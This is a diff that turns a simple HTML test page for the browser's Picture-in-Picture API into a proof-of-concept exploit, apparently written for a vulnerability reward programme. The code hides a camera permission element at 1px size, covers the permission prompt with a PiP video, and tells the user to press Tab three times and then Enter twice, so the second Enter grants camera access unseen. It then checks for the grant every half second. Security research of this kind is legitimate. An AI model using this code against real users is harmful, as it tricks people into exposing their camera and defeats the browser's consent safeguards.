@@ -2,107 +2,98 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test PiP API with Webcam and Video</title>
+    <title>PoC: Permission Prompt Obscured by Video PiP (Variant for VRP)</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; }
-        video { width: 80%; max-width: 800px; margin: 10px; }
-        .video-container { display: inline-block; }
+        html { font-family: sans-serif; }
+        #instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
+        #wrapper {
+            position: absolute;
+            bottom: 0;
+            right: 0px;
+        }
+        #permElem {
+            width: fit-content;
+            height: 1px;
+            font-size: 11px;
+            outline: none;
+            background: #fff;
+            color: #888;
+        }
+        video { display: none; } /* Hide video initially */
     </style>
 </head>
 <body>
-    <h1>Simple HTML for Testing Picture-in-Picture (PiP) API with Webcam and Video</h1>
-    <p>Click "Start Webcam" to access your camera. Then use the PiP button. Ensure your browser supports PiP and getUserMedia (e.g., Chrome).</p>
+    <h1>PoC: Permission Prompt Obscured by Video PiP (Double Enter Variant)</h1>
+    <p>This demonstrates a variant where user is tricked into pressing Enter twice: first closes PiP, second approves hidden permission. Integrated with webcam and hosted video for testing.</p>
+    <p id="instructions">Click 'Start Webcam', then press Tab three times, then Enter twice</p>
     
-    <div class="video-container">
-        <h2>Webcam Video</h2>
-        <video id="webcamPlayer" autoplay playsinline></video>
-        <br>
-        <button id="startWebcamButton">Start Webcam</button>
-        <button id="webcamPipButton" disabled>Enter Picture-in-Picture (Webcam)</button>
-    </div>
+    <!-- Webcam Video for Permission Test -->
+    <video id="webcamPlayer" autoplay playsinline></video>
+    <button id="startWebcamButton">Start Webcam (Request Camera Permission)</button>
     
-    <div class="video-container">
-        <h2>Hosted Video</h2>
-        <video id="videoPlayer" controls>
-            <source src="https://0x1337-exploit.github.io/hosting/staging/ado.mp4" type="video/mp4">
-            Your browser does not support the video tag.
-        </video>
-        <br>
-        <button id="pipButton">Enter Picture-in-Picture (Video)</button>
+    <!-- Hosted Video for PiP Obscuration -->
+    <video id="pipVideo" loop>
+        <source src="https://0x1337-exploit.github.io/hosting/staging/ado.mp4" type="video/mp4">
+    </video>
+    
+    <div id="wrapper">
+        <permission id="permElem" type="camera"></permission>
     </div>
     
     <script>
-        // Webcam functionality
-        const webcamVideo = document.getElementById('webcamPlayer');
+        const instructions = document.getElementById('instructions');
         const startWebcamButton = document.getElementById('startWebcamButton');
-        const webcamPipButton = document.getElementById('webcamPipButton');
-        
+        const webcamVideo = document.getElementById('webcamPlayer');
+        const pipVideo = document.getElementById('pipVideo');
+        const permElem = document.getElementById('permElem');
+        let pipWindow;
+
+        // Start Webcam and Trigger Permission Prompt
         startWebcamButton.addEventListener('click', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 webcamVideo.srcObject = stream;
-                webcamPipButton.disabled = false;
+                instructions.innerText = 'Press Tab three times, then Enter twice';
                 startWebcamButton.disabled = true;
+                // Focus on permElem to trigger prompt interaction
+                permElem.focus();
             } catch (error) {
                 alert('Failed to access webcam: ' + error.message);
             }
         });
-        
-        webcamPipButton.addEventListener('click', async () => {
-            if (!document.pictureInPictureEnabled) {
-                alert('Picture-in-Picture is not supported in this browser.');
-                return;
+
+        // Listen for keydown on permElem to open PiP
+        permElem.addEventListener('keydown', async (e) => {
+            if (e.keyCode === 9) return; // Ignore Tab
+            if (pipWindow) return;
+
+            // Play video and request PiP to obscure
+            pipVideo.play();
+            try {
+                await pipVideo.requestPictureInPicture();
+                // Adjust instructions for double Enter variant
+                instructions.innerText = 'Press Tab three times, then Enter twice (First closes PiP, second approves)';
+            } catch (error) {
+                console.error('PiP failed:', error);
             }
-            if (document.pictureInPictureElement) {
-                await document.exitPictureInPicture();
-                webcamPipButton.textContent = 'Enter Picture-in-Picture (Webcam)';
-            } else {
-                try {
-                    await webcamVideo.requestPictureInPicture();
-                    webcamPipButton.textContent = 'Exit Picture-in-Picture (Webcam)';
-                } catch (error) {
-                    alert('Failed to enter PiP mode for webcam: ' + error.message);
-                }
-            }
-        });
-        
-        webcamVideo.addEventListener('enterpictureinpicture', () => {
-            webcamPipButton.textContent = 'Exit Picture-in-Picture (Webcam)';
-        });
-        
-        webcamVideo.addEventListener('leavepictureinpicture', () => {
-            webcamPipButton.textContent = 'Enter Picture-in-Picture (Webcam)';
         });
 
-        // Hosted video functionality (from previous code)
-        const video = document.getElementById('videoPlayer');
-        const pipButton = document.getElementById('pipButton');
-        
-        pipButton.addEventListener('click', async () => {
-            if (!document.pictureInPictureEnabled) {
-                alert('Picture-in-Picture is not supported in this browser.');
-                return;
+        // Monitor permission status (camera granted?)
+        setInterval(async () => {
+            const permStatus = await navigator.permissions.query({ name: 'camera' });
+            if (permStatus.state === 'granted') {
+                instructions.innerText = 'Permission granted! Thank you.';
+                permElem.remove();
+                if (pipWindow) pipWindow.close();
             }
-            if (document.pictureInPictureElement) {
-                await document.exitPictureInPicture();
-                pipButton.textContent = 'Enter Picture-in-Picture (Video)';
-            } else {
-                try {
-                    await video.requestPictureInPicture();
-                    pipButton.textContent = 'Exit Picture-in-Picture (Video)';
-                } catch (error) {
-                    alert('Failed to enter PiP mode for video: ' + error.message);
-                }
-            }
+        }, 500);
+
+        // Handle PiP events
+        pipVideo.addEventListener('enterpictureinpicture', () => {
+            pipWindow = document.pictureInPictureElement;
         });
-        
-        video.addEventListener('enterpictureinpicture', () => {
-            pipButton.textContent = 'Exit Picture-in-Picture (Video)';
-        });
-        
-        video.addEventListener('leavepictureinpicture', () => {
-            pipButton.textContent = 'Enter Picture-in-Picture (Video)';
+        pipVideo.addEventListener('leavepictureinpicture', () => {
+            pipWindow = null;
         });
     </script>
 </body>
